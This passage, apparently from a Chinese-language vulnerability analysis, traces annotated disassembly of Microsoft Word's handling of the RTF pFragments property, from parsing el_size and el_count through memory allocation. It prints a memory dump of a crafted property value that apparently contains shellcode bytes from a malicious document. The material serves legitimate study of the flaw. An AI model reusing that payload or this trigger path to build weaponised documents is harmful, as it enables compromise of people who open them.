class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202EA                 <span class="keyword">push</span>    <span class="built_in">eax</span>                          <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202EB                 <span class="keyword">mov</span>     [<span class="built_in">edi</span>+<span class="number">14h</span>], <span class="built_in">eax</span>               <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202EE                 <span class="keyword">call</span>    MSO_806                      <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202F3                 <span class="keyword">push</span>    <span class="number">5</span>                            <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202F5                 <span class="keyword">pop</span>     <span class="built_in">ecx</span>                          <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202F6                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="built_in">eax</span>                     <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202F8                 <span class="keyword">rep</span> <span class="keyword">movsd</span>                            <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202FA                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span>                     <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202FC                 <span class="keyword">pop</span>     <span class="built_in">edi</span>                          <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202FD                 <span class="keyword">inc</span>     <span class="built_in">eax</span>                          <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202FE                 <span class="keyword">pop</span>     <span class="built_in">esi</span>                          <span class="comment">;</span></span><br><span class="line"><span class="symbol">    .text:</span>329202FF</span><br><span class="line"><span class="symbol">    .text:</span>329202FF loc_329202FF:                           </span><br><span class="line"><span class="symbol">    .text:</span>329202FF                 <span class="keyword">pop</span>     <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">    .text:</span><span class="number">32920300</span>                 <span class="keyword">retn</span>    <span class="number">0Ch</span></span><br><span class="line">    |       |</span><br><span class="line">    ↓       ↓</span><br><span class="line"><span class="symbol">.text:</span>31FD7296                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                     <span class="comment">; eax = 0x1</span></span><br><span class="line"><span class="symbol">.text:</span>31FD7298                 <span class="keyword">jz</span>      loc_31FD731E    <span class="comment">;            ; 为0跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>31FD729E                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_64]            <span class="comment">; eax = [ebp-0x64] = [0x0011B268-0x64] = [0x0011B204] = 0x6</span></span><br><span class="line"><span class="symbol">.text:</span>31FD72A1                 <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="number">11h</span>        <span class="comment">;            ; eax = 0x6</span></span><br><span class="line"><span class="symbol">.text:</span>31FD72A4                 <span class="keyword">ja</span>      short loc_31FD72E6 <span class="comment">;         ; 大于跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>31FD72A6                 <span class="keyword">movzx</span>   <span class="built_in">eax</span>, <span class="built_in">ds</span>:byte_31FD723C[<span class="built_in">eax</span>]   <span class="comment">; eax = [0x31FD723C+0x6] = [0x31FD7242] = 0x02</span></span><br><span class="line"><span class="symbol">.text:</span>31FD72AD                 <span class="keyword">jmp</span>     <span class="built_in">ds</span>:off_31FD7210[<span class="built_in">eax</span>*<span class="number">4</span>] <span class="comment">;     ; [0x31FD7210+eax*4] = [0x31FD7218] = 0x319C0556,off_31FD7210为Switch语句跳转表</span></span><br><span class="line">    |       |</span><br><span class="line">    ↓       ↓</span><br><span class="line"><span class="symbol">.text:</span>319C0556 loc_319C0556:                           </span><br><span class="line"><span class="symbol">.text:</span>319C0556                                                      <span class="comment">; jumptable 31FD72AD case 6           </span></span><br><span class="line"><span class="symbol">.text:</span>319C0556                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">ebx</span>+<span class="number">7674h</span>]             <span class="comment">; esi = [ebx+0x7674] = [0x02347674] = 0x023B0000 &lt;---- (pFragments属性值)</span></span><br><span class="line">    023B0000  <span class="number">36</span> 3B <span class="number">35</span> 3B <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">61</span> <span class="number">63</span> <span class="number">63</span> <span class="number">38</span>  <span class="number">6</span><span class="comment">;5;11111111acc8</span></span><br><span class="line">    023B0010  <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">31</span> <span class="number">33</span> <span class="number">30</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">31</span> <span class="number">33</span> <span class="number">31</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">31</span>  <span class="number">4161304161314161</span></span><br><span class="line">    023B0020  <span class="number">33</span> <span class="number">32</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">31</span> <span class="number">33</span> <span class="number">33</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">31</span> <span class="number">33</span> <span class="number">34</span> <span class="number">34</span> <span class="number">31</span>  <span class="number">3241613341613441</span></span><br><span class="line">    023B0030  <span class="number">36</span> <span class="number">31</span> <span class="number">33</span> <span class="number">35</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">31</span> <span class="number">33</span> <span class="number">36</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">31</span> <span class="number">33</span> <span class="number">37</span>  <span class="number">6135416136416137</span></span><br><span class="line">    023B0040  <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">31</span> <span class="number">33</span> <span class="number">38</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">31</span> <span class="number">33</span> <span class="number">39</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">32</span>  <span class="number">4161384161394162</span></span><br><span class="line">    023B0050  <span class="number">33</span> <span class="number">30</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">32</span> <span class="number">33</span> <span class="number">31</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">32</span> <span class="number">33</span> <span class="number">32</span> <span class="number">34</span> <span class="number">31</span>  <span class="number">3041623141623241</span></span><br><span class="line">    023B0060  <span class="number">36</span> <span class="number">32</span> <span class="number">33</span> <span class="number">33</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">32</span> <span class="number">33</span> <span class="number">34</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">32</span> <span class="number">33</span> <span class="number">35</span>  <span class="number">6233416234416235</span></span><br><span class="line">    023B0070  <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">32</span> <span class="number">33</span> <span class="number">36</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">32</span> <span class="number">33</span> <span class="number">37</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">32</span>  <span class="number">4162364162374162</span></span><br><span class="line">    023B0080  <span class="number">33</span> <span class="number">38</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">32</span> <span class="number">33</span> <span class="number">39</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">33</span> <span class="number">33</span> <span class="number">30</span> <span class="number">34</span> <span class="number">31</span>  <span class="number">3841623941633041</span></span><br><span class="line">    023B0090  <span class="number">36</span> <span class="number">33</span> <span class="number">33</span> <span class="number">31</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">33</span> <span class="number">33</span> <span class="number">32</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">33</span> <span class="number">33</span> <span class="number">33</span>  <span class="number">6331416332416333</span></span><br><span class="line">    023B00A0  <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">33</span> <span class="number">33</span> <span class="number">34</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">33</span> <span class="number">33</span> <span class="number">35</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">33</span>  <span class="number">4163344163354163</span></span><br><span class="line">    023B00B0  <span class="number">33</span> <span class="number">36</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">33</span> <span class="number">33</span> <span class="number">37</span> <span class="number">34</span> <span class="number">31</span> <span class="number">36</span> <span class="number">33</span> <span class="number">33</span> <span class="number">38</span> <span class="number">34</span> <span class="number">31</span>  <span class="number">3641633741633841</span></span><br><span class="line"><span class="symbol">.text:</span>319C055C                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">esi</span>                     <span class="comment">;   eax = esi = 0x023B0000(pFragments属性值)</span></span><br><span class="line"><span class="symbol">.text:</span>319C055E loc_319C055E:                           </span><br><span class="line"><span class="symbol">.text:</span>319C055E                 <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>], <span class="number">3Bh</span>          <span class="comment">;   [esi] = [0x023B0000] = 0x36 ('6'),3B=';' &lt;---- 截取参数</span></span><br><span class="line"><span class="symbol">.text:</span>319C0561                 <span class="keyword">jz</span>      loc_315E7ED1                 <span class="comment">;   为0跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>319C0567                 <span class="keyword">inc</span>     <span class="built_in">esi</span>                          <span class="comment">;   esi = esi+1 = 0x023B0001</span></span><br><span class="line"><span class="symbol">.text:</span>319C0568                 <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>], <span class="number">0</span>            <span class="comment">;   [esi] = [0x023B0001] = 0x3B(';') &lt;----</span></span><br><span class="line"><span class="symbol">.text:</span>319C056B                 <span class="keyword">jnz</span>     short loc_319C055E           <span class="comment">;   不为0跳转，这里跳转</span></span><br><span class="line">    |       |</span><br><span class="line">    ↓       ↓</span><br><span class="line">315E7ED1    C606 <span class="number">00</span>            <span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>],<span class="number">0x0</span>            <span class="comment">;   [esi] = [0x023B0001] = 0x0</span></span><br><span class="line">315E7ED4    <span class="number">46</span>                 <span class="keyword">inc</span> <span class="built_in">esi</span>                              <span class="comment">;   esi = esi+1 = 0x023B0002</span></span><br><span class="line">315E7ED5    E9 93863D00        <span class="keyword">jmp</span> wwlib.319C056D                   <span class="comment">;</span></span><br><span class="line">    |       |</span><br><span class="line">    ↓       ↓</span><br><span class="line"><span class="symbol">.text:</span>319C056D loc_319C056D:                           </span><br><span class="line"><span class="symbol">.text:</span>319C056D                 <span class="keyword">push</span>    <span class="built_in">eax</span>                          <span class="comment">; arg1: eax = 0x023B0000(pFragments属性值)</span></span><br><span class="line"><span class="symbol">.text:</span>319C056E                 <span class="keyword">call</span>    sub_31BAF3C6                 <span class="comment">; 判断pFragments的属性数组参数是否合法，合法则由字符转为整型</span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line">    ******************************************</span><br><span class="line"></span><br><span class="line">        所属模块: wwlib.dll</span><br><span class="line">        <span class="keyword">int</span> __stdcall sub_31BAF3C6(<span class="keyword">int</span> a1)</span><br><span class="line"></span><br><span class="line">    ******************************************</span><br><span class="line"><span class="symbol">    .text:</span>31BAF3C6                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                          <span class="comment">;   ebp = 0x0011B268</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3C7                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                     <span class="comment">;   ebp = esp = 0x0011B1EC</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3C9                 <span class="keyword">push</span>    <span class="built_in">esi</span>                          <span class="comment">;   esi = 0x023B0002</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3CA                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_0]                  <span class="comment">; arg1: [ebp+8] = [0x0011B1EC+8] = [0x0011B1F4] = 0x023B0000(a1)(pFragments属性值)</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3CD                 <span class="keyword">xor</span>     <span class="built_in">esi</span>, <span class="built_in">esi</span>                     <span class="comment">;   esi = esi^esi = 0x0</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3CF                 <span class="keyword">call</span>    sub_3203D37F                 <span class="comment">;   去除'\t'和' ', &lt;---- </span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line">        ************************************************</span><br><span class="line"></span><br><span class="line">            所属模块: wwlib.dll</span><br><span class="line">            _<span class="built_in">BYTE</span> *__stdcall sub_3203D37F(_<span class="built_in">BYTE</span> *a1)</span><br><span class="line"></span><br><span class="line">        ************************************************</span><br><span class="line"><span class="symbol">        .text:</span>3203D37F                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011B1EC</span></span><br><span class="line"><span class="symbol">        .text:</span>3203D380                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                 <span class="comment">;   ebp = esp = 0x0011B1DC</span></span><br><span class="line"><span class="symbol">        .text:</span>3203D382                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_0]         <span class="comment">;   eax = [ebp+8] = [0x0011B1E4] = 0x023B0000(a1)(pFragments属性值)</span></span><br><span class="line"><span class="symbol">        .text:</span>3203D385 loc_3203D385:                           </span><br><span class="line"><span class="symbol">        .text:</span>3203D385                 <span class="keyword">mov</span>     <span class="built_in">cl</span>, [<span class="built_in">eax</span>]                <span class="comment">;   cl = [eax] = [023B0000] = 0x36 ('6')</span></span><br><span class="line"><span class="symbol">        .text:</span>3203D387                 <span class="keyword">cmp</span>     <span class="built_in">cl</span>, <span class="number">9</span>                    <span class="comment">;   cl = 0x36,0x9='\t'</span></span><br><span class="line"><span class="symbol">        .text:</span>3203D38A                 <span class="keyword">jz</span>      loc_31602C3A             <span class="comment">;   为0则跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">        .text:</span>3203D390                 <span class="keyword">cmp</span>     <span class="built_in">cl</span>, <span class="number">20h</span>                  <span class="comment">;   cl = 0x36,0x20=' '</span></span><br><span class="line"><span class="symbol">        .text:</span>3203D393                 <span class="keyword">jz</span>      loc_31602C3A             <span class="comment">;   为0则跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">        .text:</span>3203D399                 <span class="keyword">pop</span>     <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011B1EC</span></span><br><span class="line"><span class="symbol">        .text:</span>3203D39A                 <span class="keyword">retn</span>    <span class="number">4</span>                        <span class="comment">;</span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line"><span class="symbol">    .text:</span>31BAF3D4</span><br><span class="line"><span class="symbol">    .text:</span>31BAF3D4 loc_31BAF3D4:                           </span><br><span class="line"><span class="symbol">    .text:</span>31BAF3D4                 <span class="keyword">mov</span>     <span class="built_in">cl</span>, [<span class="built_in">eax</span>]                    <span class="comment">;   cl = [eax] = [023B0000] = 0x36 ('6')</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3D6                 <span class="keyword">cmp</span>     <span class="built_in">cl</span>, <span class="number">30h</span>                      <span class="comment">;   cl = 0x36,0x30='0' &lt;---- 应大于等于0</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3D9                 <span class="keyword">jnb</span>     short loc_31BAF3B4           <span class="comment">;   不小于跳转，这里跳转</span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line"><span class="symbol">    .text:</span>31BAF3B4 loc_31BAF3B4:                           </span><br><span class="line"><span class="symbol">    .text:</span>31BAF3B4                 <span class="keyword">inc</span>     <span class="built_in">eax</span>                          <span class="comment">;   eax = 0x023B0001</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3B5                 <span class="keyword">cmp</span>     <span class="built_in">cl</span>, <span class="number">39h</span>                      <span class="comment">;   cl = 0x36,0x39='9' &lt;---- 应小于9</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3B8                 <span class="keyword">ja</span>      short loc_31BAF3DB           <span class="comment">;   大于跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3BA                 <span class="keyword">imul</span>    <span class="built_in">esi</span>, <span class="number">0Ah</span>                     <span class="comment">;   esi = esi*0xA = 0x0*0xA = 0x0 &lt;---- 乘10，代表el_size和el_count都是用10进制数表示的</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3BD                 <span class="keyword">movzx</span>   <span class="built_in">ecx</span>, <span class="built_in">cl</span>                      <span class="comment">;   ecx = 0x00000036</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3C0                 <span class="keyword">lea</span>     <span class="built_in">esi</span>, [<span class="built_in">esi</span>+<span class="built_in">ecx</span>-<span class="number">30h</span>]           <span class="comment">;   esi = esi+ecx-0x30 = 6 &lt;---- ASCII值转化为整型</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3C4                 <span class="keyword">jmp</span>     short loc_31BAF3D4           <span class="comment">; </span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line"><span class="symbol">    .text:</span>31BAF3D4</span><br><span class="line"><span class="symbol">    .text:</span>31BAF3D4 loc_31BAF3D4:                           </span><br><span class="line"><span class="symbol">    .text:</span>31BAF3D4                 <span class="keyword">mov</span>     <span class="built_in">cl</span>, [<span class="built_in">eax</span>]                    <span class="comment">;   cl = [eax] = [0x023B0001] = 0x00</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3D6                 <span class="keyword">cmp</span>     <span class="built_in">cl</span>, <span class="number">30h</span>                      <span class="comment">;   cl = 0x00,0x30='0'</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3D9                 <span class="keyword">jnb</span>     short loc_31BAF3B4           <span class="comment">;   不小于跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3DB loc_31BAF3DB:                           </span><br><span class="line"><span class="symbol">    .text:</span>31BAF3DB                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">esi</span>                     <span class="comment">;   eax = esi = 0x6 &lt;---- 返回值(pFragments的属性数组参数整型值)</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3DD                 <span class="keyword">pop</span>     <span class="built_in">esi</span>                          <span class="comment">;   esi = 0x023B0002</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3DE                 <span class="keyword">pop</span>     <span class="built_in">ebp</span>                          <span class="comment">;   ebp = 0x0011B268</span></span><br><span class="line"><span class="symbol">    .text:</span>31BAF3DF                 <span class="keyword">retn</span>    <span class="number">4</span>                            <span class="comment">; </span></span><br><span class="line">    |       |</span><br><span class="line">    ↓       ↓</span><br><span class="line"><span class="symbol">.text:</span>319C0573                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="built_in">eax</span>                     <span class="comment">;   edi = eax = 0x6 &lt;---- el_size</span></span><br><span class="line"><span class="symbol">.text:</span>319C0575                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">esi</span>                     <span class="comment">;   eax = esi = 0x023B0002</span></span><br><span class="line"><span class="symbol">.text:</span>319C0577</span><br><span class="line"><span class="symbol">.text:</span>319C0577 loc_319C0577:                          </span><br><span class="line"><span class="symbol">.text:</span>319C0577                 <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>], <span class="number">0</span>            <span class="comment">;   [esi] = [0x023B0002] = 0x35('5') &lt;----</span></span><br><span class="line"><span class="symbol">.text:</span>319C057A                 <span class="keyword">jnz</span>     loc_31E269F1                 <span class="comment">;   不为0，则跳转，这里跳转</span></span><br><span class="line">    |       |</span><br><span class="line">    ↓       ↓</span><br><span class="line"><span class="symbol">.text:</span>31E269F1                 <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>], <span class="number">3Bh</span>          <span class="comment">;   [esi] = [0x023B0002] = 0x35('5'),0x3B=';' &lt;---- 截取参数</span></span><br><span class="line"><span class="symbol">.text:</span>31E269F4                 <span class="keyword">jz</span>      short loc_31E269FC           <span class="comment">;   为0，则跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>31E269F6                 <span class="keyword">inc</span>     <span class="built_in">esi</span>                          <span class="comment">;   esi = esi+1 = 0x023B0003</span></span><br><span class="line"><span class="symbol">.text:</span>31E269F7                 <span class="keyword">jmp</span>     loc_319C0577                 <span class="comment">; </span></span><br><span class="line">    |       |</span><br><span class="line">    ↓       ↓</span><br><span class="line"><span class="symbol">.text:</span>31E269FC                 <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>], <span class="number">0</span>            <span class="comment">;   [esi] = [0x023B0003] = 0x00</span></span><br><span class="line"><span class="symbol">.text:</span>31E269FF                 <span class="keyword">inc</span>     <span class="built_in">esi</span>                          <span class="comment">;   esi = esi+1 = 0x023B0004</span></span><br><span class="line"><span class="symbol">.text:</span>31E26A00                 <span class="keyword">jmp</span>     loc_319C0580                 <span class="comment">; </span></span><br><span class="line">    |       |</span><br><span class="line">    ↓       ↓</span><br><span class="line"><span class="symbol">.text:</span>319C0580 loc_319C0580:                           </span><br><span class="line"><span class="symbol">.text:</span>319C0580                 <span class="keyword">push</span>    <span class="built_in">eax</span>                          <span class="comment">;   eax = 0x023B0002</span></span><br><span class="line"><span class="symbol">.text:</span>319C0581                 <span class="keyword">call</span>    sub_31BAF3C6                 <span class="comment">;   判断pFragments的属性数组参数是否合法，合法则由字符转为整型</span></span><br><span class="line"><span class="symbol">.text:</span>319C0586                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+ppstm], <span class="built_in">eax</span>             <span class="comment">;   [ebp-4] = [0x0011B268-4] = [0x0011B264] = eax = 0x5 &lt;---- el_count</span></span><br><span class="line"><span class="symbol">.text:</span>319C0589                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_8]             <span class="comment">;   eax = ebp-0x8 = 0x0011B268-8 = 0x0011B260</span></span><br><span class="line"><span class="symbol">.text:</span>319C058C                 <span class="keyword">push</span>    <span class="built_in">eax</span>                          <span class="comment">; arg2: eax = 0x0011B260</span></span><br><span class="line"><span class="symbol">.text:</span>319C058D                 <span class="keyword">push</span>    <span class="built_in">edi</span>                          <span class="comment">; arg1: edi = 0x6 &lt;---- el_size</span></span><br><span class="line"><span class="symbol">.text:</span>319C058E                 <span class="keyword">call</span>    MSO_379                      <span class="comment">;   [32081B48] = 0x326ccb92 (wwlib.3167D1C7)</span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line">    ************************************************************</span><br><span class="line"></span><br><span class="line">        所属模块: mso.dll</span><br><span class="line">        signed <span class="keyword">int</span> __stdcall MSO_379(__int16 a1, _<span class="built_in">DWORD</span> *a2)</span><br><span class="line"></span><br><span class="line">    ************************************************************</span><br><span class="line"><span class="symbol">    .text:</span>326CCB92                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011B268</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCB93                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                 <span class="comment">;   ebp = esp = 0x0011B1E8</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCB95                 <span class="keyword">push</span>    <span class="built_in">esi</span>                      <span class="comment">; arg2: esi = 0x023B0004 ASCII "11111111acc8d9e9bdbfaf3c99d97424f45b33c9b13183ebfc316b14036bab4dc9653b133296bb74ba738ab4d8f0bc04aa55"</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCB96                 <span class="keyword">push</span>    <span class="number">18h</span>                      <span class="comment">; arg1: 0x18</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCB98                 <span class="keyword">call</span>    _MsoPvAllocCore@<span class="number">4</span> <span class="comment">; MsoPvAllocCore(x)</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCB9D                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                 <span class="comment">;   eax = 0x05D755C8,(UNICODE "Description")(关键对象首地址) &lt;---- 给关键对象分配内存</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCB9F                 <span class="keyword">jz</span>      loc_32C9662C             <span class="comment">;   为0跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBA5                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>], mso.32A0C8C4 <span class="comment">; [eax] = [0x05D755C8] = 0x32A0C8C4(虚表指针) &lt;---- 关键对象的虚表指针</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBAB                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="built_in">eax</span>                 <span class="comment">;   esi = eax = 0x05D755C8(关键对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBAD</span><br><span class="line"><span class="symbol">    .text:</span>326CCBAD loc_326CCBAD:                          </span><br><span class="line"><span class="symbol">    .text:</span>326CCBAD                 <span class="keyword">test</span>    <span class="built_in">esi</span>, <span class="built_in">esi</span>                 <span class="comment">;   esi = 0x05D755C8(关键对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBAF                 <span class="keyword">jz</span>      loc_32C96633             <span class="comment">;   为0跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBB5                 <span class="keyword">mov</span>     <span class="built_in">ax</span>, [<span class="built_in">ebp</span>+arg_0]          <span class="comment">;   ax = [ebp+8] = [0x0011B1E8+8] = [0x0011B1F0] = 0x0006(a1)</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBB9                 <span class="keyword">push</span>    <span class="number">4</span>                        <span class="comment">; arg3: 4</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBBB                 <span class="keyword">mov</span>     [<span class="built_in">esi</span>+<span class="number">0Ch</span>], <span class="built_in">ax</span>            <span class="comment">;   [esi+0xc] = [0x05D755C8+0xc] = [0x05D755D4] = 0x0006 &lt;---- el_size保存到关键对象的第4个dword</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBBF                 <span class="keyword">push</span>    <span class="number">4</span>                        <span class="comment">; arg2: 4</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBC1                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">esi</span>+<span class="number">4</span>]             <span class="comment">;   eax = esi+4 = 0x05D755C8+4 = 0x05D755CC</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBC4                 <span class="keyword">push</span>    <span class="built_in">eax</span>                      <span class="comment">; arg1: eax = 0x05D755CC</span></span><br><span class="line"><span class="symbol">    .text:</span>326CCBC5                 <span class="keyword">call</span>    MSO_501                  <span class="comment">; </span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line">        ****************************************************************</span><br><span class="line"></span><br><span class="line">            所属模块: mso.dll</span><br><span class="line">            signed <span class="keyword">int</span> __stdcall MSO_501(<span class="keyword">int</span> a1, __int16 a2, <span class="keyword">int</span> a3)</span><br><span class="line"></span><br><span class="line">        ****************************************************************</span><br><span class="line"><span class="symbol">        .text:</span>326098B5                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011B1E8</span></span><br><span class="line"><span class="symbol">        .text:</span>326098B6                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                 <span class="comment">;   ebp = esp = 0x0011B1D0</span></span><br><span class="line"><span class="symbol">        .text:</span>326098B8                 <span class="keyword">push</span>    <span class="number">0</span>                        <span class="comment">; arg4: 0</span></span><br><span class="line"><span class="symbol">        .text:</span>326098BA                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_8]              <span class="comment">; arg3: [ebp+0x10] = [0x0011B1E0] = 0x00000004(a3)</span></span><br><span class="line"><span class="symbol">        .text:</span>326098BD                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_4]              <span class="comment">; arg2: [ebp+0xc] = [0x0011B1DC] = 0x00000004(a2)</span></span><br><span class="line"><span class="symbol">        .text:</span>326098C0                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_0]              <span class="comment">; arg1: [ebp+0x8] = [0x0011B1D8] = 0x05D755CC(a1)</span></span><br><span class="line"><span class="symbol">        .text:</span>326098C3                 <span class="keyword">call</span>    sub_32608E17             <span class="comment">; </span></span><br><span class="line">                |       |</span><br><span class="line">                ↓       ↓</span><br><span class="line">            *****************************************************************************</span><br><span class="line"></span><br><span class="line">                所属模块: mso.dll</span><br><span class="line">                signed <span class="keyword">int</span> __stdcall sub_32608E17(<span class="keyword">int</span> a1, __int16 a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4)</span><br><span class="line"></span><br><span class="line">            *****************************************************************************</span><br><span class="line"><span class="symbol">            .text:</span>32608E17                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                      <span class="comment">;   ebp = 0x0011B1D0</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E18                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                 <span class="comment">;   ebp = esp = 0x0011B1B8</span></span><br><span class="line"><span class="symbol">            .text:</span>32608E1A                 <span class="keyword">push</span> 